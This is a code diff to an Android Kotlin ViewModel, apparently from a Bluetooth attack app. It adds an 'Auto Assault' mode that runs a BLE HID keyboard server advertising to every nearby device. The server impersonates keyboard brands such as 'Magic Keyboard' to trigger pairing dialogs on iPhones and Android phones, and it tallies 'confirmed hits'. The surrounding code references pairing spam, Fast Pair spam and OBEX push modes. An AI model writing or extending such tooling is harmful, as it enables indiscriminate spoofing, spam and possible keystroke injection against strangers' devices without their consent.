@@ -38,6 +38,7 @@ class BluetoothHidViewModel : ViewModel() {
     internal val hidPairingSpammer = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
         HidPairingSpammer()
     } else null
+    internal val bleHidServer = BleHidKeyboardServer()
 
     // Active payload for current attack
     val activePayload = MutableLiveData<BluetoothPayload?>(null)
@@ -94,6 +95,11 @@ class BluetoothHidViewModel : ViewModel() {
     val skippedTargets = MutableStateFlow(0)
     val dwellTimeMs = MutableStateFlow(4000L) // how long to keep dialog visible
 
+    // ---- Auto Assault mode (HID keyboard to all) ----
+    val isAutoAssault = MutableStateFlow(false)
+    val currentAssaultTarget = MutableStateFlow<String?>(null)
+    val currentAssaultProfile = MutableStateFlow<String?>(null)
+
     // Image data for IMAGE / VCARD_PHOTO types
     private var pendingImageBytes: ByteArray? = null
     private var pendingImageMimeType: String = "image/jpeg"
@@ -107,6 +113,7 @@ class BluetoothHidViewModel : ViewModel() {
     private var crayScanJob: Job? = null
     private var crayObexJob: Job? = null
     private var crayHidJob: Job? = null
+    private var autoAssaultFeedJob: Job? = null
 
     // ---- Form field management for Data Send tab ----
 
@@ -340,6 +347,90 @@ class BluetoothHidViewModel : ViewModel() {
         }
     }
 
+    // ---- AUTO ASSAULT: HID keyboard to ALL visible devices ----
+
+    /**
+     * One-button keyboard assault: starts a BLE GATT HID keyboard server
+     * that advertises to ALL nearby devices. iPhones and Android phones see
+     * a real keyboard and show a system pairing dialog with our device name.
+     *
+     * This uses BLE HOGP (HID Over GATT Profile) — the only mechanism that
+     * reliably triggers pairing dialogs on both iOS and Android.
+     *
+     * The server:
+     * 1. Advertises as a BLE HID keyboard (service UUID 0x1812)
+     * 2. Runs a GATT server with real HID characteristics
+     * 3. When a phone probes the GATT server and finds a keyboard, it shows the dialog
+     * 4. We detect confirmed pairings via ACTION_PAIRING_REQUEST
+     * 5. Rotates through keyboard brand names every few seconds
+     */
+    fun startAutoAssault(context: Context) {
+        if (_state.value is HidState.Attacking || _state.value is HidState.CrayMode) return
+
+        isAutoAssault.value = true
+        _keystrokesSent.value = 0
+        _connectedCount.value = 0
+        confirmedHits.value = 0
+        skippedTargets.value = 0
+        _state.value = HidState.Attacking(0)
+
+        // Use custom name or default
+        val name = customDeviceName.value ?: "Magic Keyboard"
+
+        // Start BLE HID keyboard server with name rotation
+        bleHidServer.start(context, name, rotateNames = true)
+
+        // Observe confirmed hits (ACTION_PAIRING_REQUEST = target showed dialog)
+        connectedObserverJob = viewModelScope.launch {
+            bleHidServer.confirmedHits.collect { hits ->
+                confirmedHits.value = hits
+                _keystrokesSent.postValue(hits)
+            }
+        }
+
+        // Observe GATT connections (devices probing our HID service)
+        keystrokeObserverJob = viewModelScope.launch {
+            bleHidServer.connectionCount.collect { connections ->
+                _connectedCount.postValue(connections)
+                _state.postValue(HidState.Attacking(connections))
+            }
+        }
+
+        // Observe current advertised name
+        autoAssaultFeedJob = viewModelScope.launch {
+            bleHidServer.currentName.collect { profileName ->
+                currentAssaultProfile.value = profileName
+            }
+        }
+
+        // Observe events for live status
+        errorObserverJob = viewModelScope.launch {
+            bleHidServer.lastEvent.collect { event ->
+                currentAssaultTarget.value = event
+            }
+        }
+
+        CrashLogger.log(context, "AutoAssault", "BLE HID Keyboard Server started — broadcasting to all nearby devices as '$name'")
+    }
+
+    fun stopAutoAssault(context: Context) {
+        isAutoAssault.value = false
+        _state.value = HidState.Stopping
+
+        connectedObserverJob?.cancel()
+        keystrokeObserverJob?.cancel()
+        autoAssaultFeedJob?.cancel()
+        errorObserverJob?.cancel()
+
+        bleHidServer.stop(context)
+
+        currentAssaultTarget.value = null
+        currentAssaultProfile.value = null
+        _state.value = HidState.Idle
+
+        CrashLogger.log(context, "AutoAssault", "BLE HID Keyboard Server stopped")
+    }
+
     // ---- CRAY MODE: Fast Pair spam + pairing spam + OBEX, sorted by RSSI ----
 
     /** Get devices sorted by signal strength (closest first) using DeviceFilter RSSI data */
@@ -537,6 +628,12 @@ class BluetoothHidViewModel : ViewModel() {
             return
         }
 
+        // If auto-assault is active, delegate to stopAutoAssault
+        if (isAutoAssault.value) {
+            stopAutoAssault(context)
+            return
+        }
+
         _state.value = HidState.Stopping
 
         connectedObserverJob?.cancel()
@@ -561,11 +658,13 @@ class BluetoothHidViewModel : ViewModel() {
         connectedObserverJob?.cancel()
         keystrokeObserverJob?.cancel()
         attackLoopJob?.cancel()
+        autoAssaultFeedJob?.cancel()
         crayTimerJob?.cancel()
         crayScanJob?.cancel()
         crayObexJob?.cancel()
         crayHidJob?.cancel()
         _isScanning.value = false
         isCrayMode.value = false
+        isAutoAssault.value = false
     }
 }
